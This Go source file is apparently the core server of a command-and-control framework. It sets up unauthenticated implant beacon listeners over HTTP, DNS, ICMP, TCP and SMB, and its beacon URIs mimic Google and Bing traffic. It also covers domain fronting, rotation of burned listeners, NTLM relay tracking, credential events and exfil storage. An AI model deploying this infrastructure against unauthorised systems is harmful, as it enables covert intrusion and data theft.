package server

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime/debug"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/prometheus/client_golang/prometheus"
	"gorm.io/gorm"
)

type Server struct {
	cfg            *config.Config
	db             *gorm.DB
	router         *gin.Engine
	wsClients      map[*websocket.Conn]UserSession
	wsMutex        sync.RWMutex
	wsUpgrader     websocket.Upgrader
	rateLimiter    *middleware.RateLimiter
	apiRateLimiter *middleware.APIRateLimiter
	loginLockout   *loginLockoutTracker
	socksEngine    *socksRelayEngine
	startTime      time.Time

	dnsListener           *DNSBeaconListener
	icmpListener          *ICMPBeaconListener
	grpcListener          *GRPCListener
	smbLn                 net.Listener
	tcpLn                 net.Listener
	tcpProtoListener      *TCPProtoListener
	screenMonitorImplants map[string]time.Time
	screenMonitorMu       sync.Mutex

	// P0-3: rportfwd (reverse port forward)
	rportfwdListeners map[string]*rportfwdRelay
	rportfwdMu        sync.Mutex

	trafficLog  *trafficRing
	updateState updateCheckState

	// Domain fronting
	domainFrontDomains []string
	domainFrontMu      sync.Mutex
	domainFrontAuto    bool
	domainFrontStatus  map[string]*frontDomainState

	// WebSocket hub
	wsHub     *WebSocketHub
	wsHubOnce sync.Once

	// Event system
	eventManager *EventManager

	// Beacon payload cipher (nil = disabled)
	beaconCipher *crypto.StreamCipher

	// ECDH session manager (nil = disabled / old XOR mode)
	sessionManager *crypto.SessionManager

	monitorCollector *MonitorCollector

	// Plugin marketplace
	marketplace *plugin.Marketplace

	// Plugin execution manager
	pluginManager *plugin.Manager

	// Optimizations
	configReloader *ConfigReloader
	backupManager  *BackupManager
	configPath     string
	ctx            context.Context
	ctxCancel      context.CancelFunc
	wg             sync.WaitGroup

	// Extra listeners started dynamically via the UI (create listener).
	// Each entry is keyed by "scheme://host:port".
	extraListeners   map[string]io.Closer
	extraListenersMu sync.Mutex

	metrics *MetricsCollector

	// NTLM relay session tracking
	ntlmRelays *ntlmRelayStore

	// Bulk operation history ring buffer
	bulkHistory   []BulkResult
	bulkHistoryMu sync.Mutex

	// Per-agent task queue depth tracking (agentID → pending task count)
	agentPendingTasks   map[string]int
	agentPendingTasksMu sync.Mutex

	// External C2 channels (WebSocket relay, Discord, Slack)
	extC2Channels   map[string]*extC2WSChannel
	extC2ChannelsMu sync.Mutex
	extC2TaskQueue  map[string][]extC2Task
	extC2TaskMu     sync.Mutex

	// Async build job tracking
	buildJobs   map[string]*BuildJob
	buildJobsMu sync.RWMutex
}

// BulkResult tracks a batch command operation.
type BulkResult struct {
	ID        int       `json:"id"`
	Timestamp time.Time `json:"timestamp"`
	Command   string    `json:"command"`
	TaskType  string    `json:"task_type"`
	Created   int       `json:"tasks_created"`
	Skipped   int       `json:"skipped_locked"`
	Failed    int       `json:"failed"`
	Operator  string    `json:"operator"`
}

const maxBulkHistory = 50

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders(cfg.Server.TLSEnabled))
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                   cfg,
		db:                    database,
		router:                r,
		wsClients:             make(map[*websocket.Conn]UserSession),
		loginLockout:          newLoginLockoutTracker(),
		socksEngine:           newSocksRelayEngine(),
		startTime:             time.Now(),
		screenMonitorImplants: make(map[string]time.Time),
		rportfwdListeners:     make(map[string]*rportfwdRelay),
		trafficLog:            newTrafficRing(),
		eventManager:          NewEventManager(database),
		extraListeners:        make(map[string]io.Closer),
		domainFrontStatus:     make(map[string]*frontDomainState),
		agentPendingTasks:     make(map[string]int),
		ntlmRelays:            newNTLMRelayStore(),
		extC2Channels:         make(map[string]*extC2WSChannel),
		extC2TaskQueue:        make(map[string][]extC2Task),
		buildJobs:             make(map[string]*BuildJob),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				// Frontend runs on localhost:3000, backend on localhost:8080
				// — compare only hostname, since ports always differ.
				originHost := u.Hostname()
				if len(cfg.Server.AllowedOrigins) == 0 {
					return true
				}
				for _, allowed := range cfg.Server.AllowedOrigins {
					if originHost == allowed {
						return true
					}
				}
				return false
			},
		},
	}

	s.ctx, s.ctxCancel = context.WithCancel(context.Background())

	// Initialize rate limiters with context for graceful shutdown
	s.rateLimiter = middleware.NewRateLimiter(s.ctx, cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second)
	s.apiRateLimiter = middleware.NewAPIRateLimiter(s.ctx, cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate)

	// Start periodic cleanup for login lockout entries
	s.loginLockout.startCleanup(s.ctx)

	// Initialize beacon payload cipher if configured
	if cfg.Crypto.Key != "" {
		key, err := hex.DecodeString(cfg.Crypto.Key)
		if err == nil && len(key) == 32 {
			s.beaconCipher = crypto.NewStreamCipher(key)
			slog.Info("Beacon payload encryption enabled")
		} else {
			slog.Warn("Invalid crypto key (must be 32-byte hex), beacon encryption disabled", "err", err)
		}
	}

	s.apiRateLimiter.SetWhitelist(cfg.RateLimit.API.Whitelist)

	s.metrics = NewMetricsCollector(s)
	s.metrics.Register(prometheus.DefaultRegisterer)
	r.Use(metricsMiddleware(s.metrics))

	s.setupRoutes()

	// Initialize plugin marketplace
	s.marketplace = plugin.NewMarketplace(database)
	s.marketplace.StartUpdateChecker(PluginUpdateCheckInterval)

	// Initialize plugin execution manager
	s.pluginManager = plugin.NewManager(database)
	s.pluginManager.SetMarketplace(s.marketplace)
	pluginDir := filepath.Join(s.cfg.Server.DataDir, "plugins")
	if err := os.MkdirAll(pluginDir, 0750); err != nil {
		slog.Warn("Failed to create plugin data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk(pluginDir); err != nil {
		slog.Warn("Failed to load plugins from data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk("plugins"); err != nil {
		slog.Warn("Failed to load bundled plugins", "dir", "plugins", "err", err)
	}

	// Register event handlers
	s.eventManager.On(EventImplantCheckin, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventImplantDisconnect, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskComplete, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskFail, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventCredentialFound, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.migrateAutomationRules()
	s.registerBuiltinAutomations()

	s.monitorCollector = NewMonitorCollector(s)
	s.monitorCollector.Start()

	return s
}

func (s *Server) InitOptimizations(configPath string) {
	s.configPath = configPath
	s.configReloader = NewConfigReloader(s.cfg, configPath, func(cfg *config.Config) {
		slog.Info("Config reloaded, applying changes")
	})
	if err := s.configReloader.Start(); err != nil {
		slog.Warn("Failed to start config reloader", "error", err)
	}

	backupDir := filepath.Join(s.cfg.Server.DataDir, "backups")
	var backupKey string
	if s.cfg.Crypto.Key != "" {
		backupKey = s.cfg.Crypto.Key
	}

	var err error
	s.backupManager, err = NewBackupManager(s.db, s.cfg.Database.Path, backupDir, backupKey)
	if err != nil {
		slog.Warn("Failed to initialize backup manager", "error", err)
		return
	}

	if err := s.backupManager.Start("daily"); err != nil {
		slog.Warn("Failed to start backup manager", "error", err)
	}
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// CORS middleware — applies to all routes
	s.router.Use(middleware.CORS(s.cfg.Server.AllowedOrigins))

	// Unauthenticated routes
	s.registerPublicRoutes()

	// Protected routes
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(middleware.CSRFProtect())
	auth.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
	auth.Use(s.apiRateLimiter.LimitByUser())
	auth.Use(s.AuditMiddleware())
	auth.Use(s.ActivityMiddleware())
	{
		s.registerAgentRoutes(auth)
		s.registerAgentCommandRoutes(auth)
		s.registerAutomationRoutes(auth)
		s.registerPluginRoutes(auth)
		s.registerTaskRoutes(auth)
		s.registerCredentialRoutes(auth)
		s.registerGenerateRoutes(auth)
		s.registerListenerRoutes(auth)
		s.registerReconRoutes(auth)
		s.registerSettingsRoutes(auth)
		s.registerUserRoutes(auth)
		s.registerCampaignRoutes(auth)
		s.registerIntegrationRoutes(auth)
		s.registerDNSRoutes(auth)
		s.registerStubRoutes(auth)
	}

	// Agent Beacon API (no auth — agents check in unauthenticated)
	beaconAPI := s.router.Group("/api/v1")
	beaconAPI.Use(s.rateLimiter.Limit())
	beaconAPI.Use(s.trafficMiddleware())
	{
		beaconAPI.POST("/beacon", s.handleBeacon)
		beaconAPI.POST("/screen_frame", s.handleScreenFrame)

		// Malleable profile support (similar to Cobalt Strike)
		beaconAPI.POST("/generate_204", s.handleBeacon)
		beaconAPI.POST("/th", s.handleBeacon)
		beaconAPI.GET("/generate_204", s.handleBeacon)
		beaconAPI.GET("/th", s.handleBeacon)
	}

	// Protected REST API (authentication required)
	restAPI := s.router.Group("/api/v1")
	restAPI.Use(middleware.AuthRequired(s.db))
	restAPI.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
	restAPI.Use(s.apiRateLimiter.LimitByUser())
	{
		s.registerAPIRoutes(restAPI)
	}

	// Root-level malleable profile routes (agent beacon_uri does NOT include /api/v1/ prefix)
	s.router.POST("/generate_204", s.handleBeacon)
	s.router.GET("/generate_204", s.handleBeacon)

	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
	s.router.GET("/th", s.handleBeacon)
	s.router.POST("/th", s.handleBeacon)
	s.router.NoRoute(func(c *gin.Context) {
		// Only forward POST without Accept: application/json to beacon handler
		// (implants send POST without JSON accept header)
		if c.Request.Method == "POST" && c.GetHeader("Accept") != "application/json" {
			s.rateLimiter.Limit()(c)
			if c.IsAborted() {
				return
			}
			s.handleBeacon(c)
			return
		}
		respondError(c, http.StatusNotFound, "not found")
	})

	// External C2 (redirector-facing, no auth, rate-limited)
	extc2 := s.router.Group("/extc2/v1")
	extc2.Use(s.rateLimiter.Limit())
	{
		extc2.POST("/receive", s.handleExtC2Receive)
		extc2.POST("/send", s.handleExtC2Send)
	}

	// Post-group authenticated routes
	s.registerMonitorRoutes(auth)
	s.registerDashboardCharts(auth)
	s.registerBOFRoutes(auth)
	s.registerMiscRoutes(auth)
}


// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	origin := c.GetHeader("Origin")
	if origin != "" && !s.wsUpgrader.CheckOrigin(c.Request) {
		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "origin not allowed"})
		return
	}
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
		return nil
	})

	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	session := UserSession{Username: username, ConnectedAt: time.Now()}

	s.wsMutex.Lock()
	s.wsClients[conn] = session
	s.wsMutex.Unlock()

	slog.Info("WebSocket client connected", "user", username)
	s.broadcastUserEvent("user_online", username, session)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("WebSocket reader panicked", "user", username, "recover", r)
			}
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			s.broadcastUserEvent("user_offline", username, session)
			conn.Close()
			slog.Info("WebSocket client disconnected", "user", username)
		}()

		ticker := time.NewTicker(WSPingInterval)
		defer ticker.Stop()

		readDone := make(chan struct{})
		go func() {
			defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
			defer close(readDone)
			for {
				conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
				_, _, err := conn.ReadMessage()
				if err != nil {
					return
				}
			}
		}()

		for {
			select {
			case <-readDone:
				return
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			}
		}
	}()
}

// UserSession holds metadata about a connected operator WebSocket session.
type UserSession struct {
	Username    string    `json:"username"`
	ConnectedAt time.Time `json:"connected_at"`
}

// getOnlineUsers returns the list of currently connected operator sessions.
func (s *Server) getOnlineUsers() []UserSession {
	s.wsMutex.RLock()
	defer s.wsMutex.RUnlock()
	users := make([]UserSession, 0, len(s.wsClients))
	seen := make(map[string]bool)
	for _, session := range s.wsClients {
		if !seen[session.Username] {
			seen[session.Username] = true
			users = append(users, session)
		}
	}
	return users
}

// broadcastUserEvent sends a user online/offline event to all WebSocket clients.
func (s *Server) broadcastUserEvent(eventType, username string, session UserSession) {
	msg, _ := json.Marshal(map[string]interface{}{
		"type":         eventType,
		"username":     username,
		"connected_at": session.ConnectedAt,
		"online_users": s.getOnlineUsers(),
	})
	s.broadcastToClients(msg)
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Iterates over a snapshot of the map to avoid holding the lock during writes.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.Lock()
	clients := make([]*websocket.Conn, 0, len(s.wsClients))
	for conn := range s.wsClients {
		clients = append(clients, conn)
	}
	s.wsMutex.Unlock()

	for _, conn := range clients {
		select {
		case <-s.ctx.Done():
			return
		default:
		}
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := conn.WriteMessage(websocket.TextMessage, message); err != nil {
			if s.ctx.Err() != nil {
				return
			}
			slog.Debug("Failed to send WebSocket message", "err", err)
			s.wsMutex.Lock()
			conn.Close()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
		}
	}
}

// broadcastAgentOnline pushes agent online events to all WebSocket clients.
func (s *Server) broadcastAgentOnline(agent db.Implant, isNew bool) {
	payload := map[string]interface{}{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
		"new":      isNew,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent online notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentOffline pushes agent offline events to all WebSocket clients.
func (s *Server) broadcastAgentOffline(agent db.Implant) {
	payload := map[string]string{
		"type":     "agent_offline",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent offline notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentDataUpdate pushes agent data changes to all WebSocket clients.
func (s *Server) broadcastAgentDataUpdate(agentID string, data map[string]interface{}) {
	payload := map[string]interface{}{
		"type":     "agent_data_update",
		"agent_id": agentID,
		"data":     data,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent data update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":       "task_update",
		"agent_id":   agentID,
		"task_id":    task.ID,
		"task_type":  task.Type,
		"status":     task.Status,
		"command":    task.Command,
		"created_by": task.CreatedBy,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func (s *Server) pushBulkResult(r BulkResult) {
	s.bulkHistoryMu.Lock()
	defer s.bulkHistoryMu.Unlock()
	if len(s.bulkHistory) >= maxBulkHistory {
		s.bulkHistory = s.bulkHistory[1:]
	}
	r.ID = len(s.bulkHistory) + 1
	s.bulkHistory = append(s.bulkHistory, r)
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	s.cleanupGhostAgents()

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	// Clean old agent binaries
	s.cleanOldFiles(filepath.Join(dataDir, "agents"), cutoff)

	slog.Info("old data cleanup completed")
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = 60
	}
	return time.Duration(d) * time.Second
}

// AgentStatusInfo holds display info for an agent's status
type AgentStatusInfo struct {
	Status    string // "online", "stale", "offline"
	Label     string // "Online", "Timeout", "Offline"
	DotColor  string // tailwind bg class
	BgColor   string // tailwind bg class
	TextColor string // tailwind text class
	Anim      string // animate-pulse or empty
}

func (s *Server) agentStatus(a db.Implant) AgentStatusInfo {
	since := time.Since(a.LastSeen)
	threshold := s.offlineThreshold()
	switch {
	case since < threshold:
		return AgentStatusInfo{"online", "Online", "bg-emerald-500", "bg-emerald-50", "text-emerald-700", "animate-pulse"}
	case since < 30*time.Minute:
		return AgentStatusInfo{"stale", "Timeout", "bg-amber-500", "bg-amber-50", "text-amber-700", ""}
	default:
		return AgentStatusInfo{"offline", "Offline", "bg-red-500", "bg-red-50", "text-red-700", ""}
	}
}

// cleanupGhostAgents removes invalid or long-dead implant records.
func (s *Server) cleanupGhostAgents() {
	ghostCutoff := time.Now().Add(-1 * time.Hour)
	var ghosts []db.Implant
	if err := s.db.Where("(hostname = '' OR hostname IS NULL) AND (ip = '' OR ip IS NULL) AND last_seen < ?", ghostCutoff).Find(&ghosts).Error; err != nil {
		return
	}
	if len(ghosts) > 0 {
		ghostIDs := make([]string, len(ghosts))
		for i, a := range ghosts {
			ghostIDs[i] = a.ID
		}
		s.db.Where("agent_id IN ?", ghostIDs).Delete(&db.Task{})
		s.db.Where("id IN ?", ghostIDs).Delete(&db.Implant{})
		slog.Info("Removed ghost agents", "count", len(ghosts))
	}

	offlineCutoff := time.Now().AddDate(0, 0, -30)
	var stale []db.Implant
	if err := s.db.Where("last_seen < ?", offlineCutoff).Find(&stale).Error; err != nil {
		return
	}
	if len(stale) > 0 {
		staleIDs := make([]string, len(stale))
		for i, a := range stale {
			staleIDs[i] = a.ID
		}
		s.db.Where("agent_id IN ?", staleIDs).Delete(&db.Task{})
		s.db.Where("id IN ?", staleIDs).Delete(&db.Implant{})
		slog.Info("Removed stale offline agents", "count", len(stale))
	}
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff) // recurse into agent subdirs
			// optionally remove empty dirs
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(path)
		}
	}
}

func (s *Server) Shutdown() {
	slog.Info("Shutting down server...")
	s.extraListenersMu.Lock()
	for key, srv := range s.extraListeners {
		slog.Info("Shutting down extra listener", "key", key)
		srv.Close()
	}
	clear(s.extraListeners)
	s.extraListenersMu.Unlock()
	if s.tcpLn != nil {
		s.tcpLn.Close()
	}
	if s.ctxCancel != nil {
		s.ctxCancel()
	}
	s.wg.Wait()
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()
	go s.cleanupStaleSocks()
	go s.periodicRPortFwdCleanup()

	// periodic metrics refresh (same interval as nav stats cache)
	go func() {
		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				s.updateMetricsFromDB()
			}
		}
	}()

	// Initialize Circuit Breaker
	cb := NewCircuitBreaker(s.cfg)
	cb.SetOnBurnedHandler(func(targetID string) {
		slog.Warn("Circuit breaker triggered: listener BURNED", "listener_id", targetID)
		// Automatically push profile rotation to agents on this listener
		s.rotateAgentsOnBurnedListener(targetID)
	})
	cb.Start()

	// start update checker
	s.initUpdateChecker()

	// periodic cleanup of hosted one-liner payloads
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("Payload cleanup panicked", "recover", r)
			}
		}()
		ticker := time.NewTicker(PayloadCleanupInterval)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				s.cleanupOldPayloads()
			}
		}
	}()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		go s.startTCPListener()
	}
	if s.cfg.Server.SMBEnabled && s.cfg.Server.SMBPipe != "" {
		go s.startSMBListener()
	}

	// Start ICMP C2 listener if enabled
	if s.cfg.Server.ICMPEnabled {
		il := NewICMPBeaconListener(s.cfg.Server.ICMPAddr)
		il.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("ICMP beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		if err := il.Start(); err != nil {
			slog.Error("Failed to start ICMP listener", "err", err)
		}
		s.icmpListener = il
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0, s.cfg.Server.DNSAddr)
		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("DNS beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		s.dnsListener = dl
		go dl.Start()
	}

	// Restore External C2 channels from DB
	s.restoreExtC2Channels()

	// Start async build job cleanup goroutine
	go s.cleanupBuildJobs()

	// Start extra listeners from DB (created via the UI in previous sessions)
	s.startExtraListenersFromDB()

	// Check main server port availability before attempting to bind
	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	if !isPortAvailable(s.cfg.Server.Host, s.cfg.Server.Port) {
		return fmt.Errorf("port %s is already in use — check for another server instance or change server.port in config.yaml", addr)
	}

	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:         addr,
			Handler:      s.router,
			TLSConfig:    tlsCfg,
			ReadTimeout:  HTTPReadTimeout,
			WriteTimeout: HTTPWriteTimeout,
			IdleTimeout:  HTTPIdleTimeout,
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

// startExtraListenersFromDB starts extra listeners for all enabled listeners
// stored in the database. Called at server startup.
func (s *Server) startExtraListenersFromDB() {
	var listeners []db.Listener
	// Load all enabled listeners (DNS/ICMP are loaded from DB too now)
	if err := s.db.Find(&listeners, "enabled = ?", true).Error; err != nil {
		slog.Error("Failed to load listeners from DB", "err", err)
		return
	}
	for _, l := range listeners {
		scheme := l.Scheme
		if scheme == "" {
			scheme = l.Type
		}
		addr := l.Host + ":" + itoa(l.Port)
		key := scheme + "://" + addr

		// Skip if this is the main server address (already served)
		mainAddr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
		if addr == mainAddr {
			slog.Debug("Skipping extra listener — matches main server address", "key", key)
			continue
		}

		// Check port availability before starting (skip for DNS/ICMP which may not use TCP port)
		needsPort := scheme != "dns" && scheme != "icmp"
		if needsPort && !isPortAvailable(l.Host, l.Port) {
			slog.Warn("Port not available for extra listener, skipping", "key", key, "addr", addr)
			continue
		}

		slog.Info("Restoring extra listener from DB", "key", key, "addr", addr)
		if err := s.startExtraListener(key, addr, scheme); err != nil {
			slog.Error("Failed to start extra listener from DB", "key", key, "err", err)
		}
	}
}

// startExtraListener starts an additional listener on the given addr.
func (s *Server) startExtraListener(key, addr, scheme string) error {
	switch scheme {
	case "http", "https":
		return s.startExtraHTTPListener(key, addr, scheme)
	case "tcp", "tls":
		return s.startExtraTCPListener(key, addr, scheme)
	case "dns", "icmp":
		// DNS/ICMP listeners are currently configured via config.yaml, not per-listener in DB.
		// Future work: support starting DNS/ICMP listeners per DB record.
		slog.Warn("DNS/ICMP listeners from DB not yet supported, skipping", "scheme", scheme, "key", key)
		return nil
	default:
		slog.Warn("Unknown extra listener scheme, skipping", "scheme", scheme, "key", key)
		return nil
	}
}

func (s *Server) startExtraHTTPListener(key, addr, scheme string) error {
	srv := &http.Server{
		Addr:         addr,
		Handler:      s.router,
		ReadTimeout:  HTTPReadTimeout,
		WriteTimeout: HTTPWriteTimeout,
		IdleTimeout:  HTTPIdleTimeout,
	}
	s.extraListenersMu.Lock()
	s.extraListeners[key] = srv
	s.extraListenersMu.Unlock()
	s.wg.Add(1)
	go func() {
		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
		defer s.wg.Done()
		var err error
		if scheme == "https" {
			slog.Info("Extra HTTPS listener started", "addr", addr, "key", key)
			err = srv.ListenAndServeTLS(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		} else {
			slog.Info("Extra HTTP listener started", "addr", addr, "key", key)
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			slog.Error("Extra HTTP listener error", "key", key, "addr", addr, "err", err)
		}
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraTCPListener(key, addr, scheme string) error {
	var ln net.Listener
	var err error
	if scheme == "tls" {
		cert, certErr := tls.LoadX509KeyPair(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		if certErr != nil {
			return fmt.Errorf("loading TLS cert for extra TCP listener: %w", certErr)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		ln, err = tls.Listen("tcp", addr, tlsCfg)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("starting extra TCP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = ln
	s.extraListenersMu.Unlock()

	slog.Info("Extra TCP listener started", "addr", addr, "key", key, "tls", scheme == "tls")
	s.wg.Add(1)
	go func() {
		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
		defer s.wg.Done()
		for {
			conn, aErr := ln.Accept()
			if aErr != nil {
				break
			}
			go s.handleTCPConnection(conn)
		}
		ln.Close()
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

// stopExtraListener gracefully stops an extra listener by key.
